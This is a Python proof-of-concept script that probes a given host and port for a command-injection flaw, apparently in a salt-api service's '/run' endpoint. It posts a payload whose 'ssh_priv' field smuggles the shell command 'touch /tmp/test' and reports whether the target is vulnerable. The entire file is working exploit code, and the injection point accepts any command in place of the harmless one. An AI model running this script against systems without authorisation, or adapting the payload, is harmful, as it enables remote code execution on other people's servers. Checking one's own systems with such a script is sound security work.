#!/usr/bin/python
# _*_ coding:gbk _*_

import sys
import requests
import json


def run_proto(target):
    try:
        requests.packages.urllib3.disable_warnings()
        url = '{}/run'.format(target)
        print("target: %s\n" % url)
        payload = '''token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/test%3b'''
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0',
            'Content-Type': 'application/x-www-form-urlencoded'}
        req = requests.post(url=url, data=payload, headers=header, verify=False, allow_redirects=False, timeout=(6, 6))
        if (req.status_code == 200 and '"return"' in req.text) or req.status_code == 500:
            print(url + '\t Exist')
            print(req.text)
            return True
        else:
            return False
    except Exception as e:
        return False


def run(ipp, portt):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ipp, portt)
        proto_result = run_proto(target)
        if proto_result:
            return True
        else:
            i = i + 1
            
            
if __name__ == '__main__':
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = str(int(target.split(':')[1]))
    result = run(ip, port)
    if result:
        print('Exist')
    else:
        print('UnExist')
